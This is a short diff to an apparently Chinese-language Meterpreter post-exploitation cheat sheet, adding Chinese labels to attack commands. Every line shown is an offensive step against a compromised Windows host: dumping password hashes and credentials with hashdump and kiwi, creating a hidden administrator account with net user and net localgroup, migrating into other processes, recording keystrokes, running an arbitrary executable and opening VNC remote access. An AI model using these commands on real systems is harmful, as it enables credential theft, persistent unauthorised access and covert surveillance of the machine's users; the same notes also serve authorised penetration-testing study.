@@ -38,17 +38,21 @@ use 使用
 shell 反弹shell
 
 `hashdump`
-
+load加载模块
 `load kiwi`
 `creds_all`
 
+在shell下
 net user xxx /add
 net localgroup administrators xxx /add
-
+截图
 screenshot
+查看进程
 ps 
 migrate PID
 getuid
 `run post/windows/capture/keylog_recorder` 键盘记录
+
+执行exe
 `execute -f c:\\aaa.exe`
 `run vnc` 远程
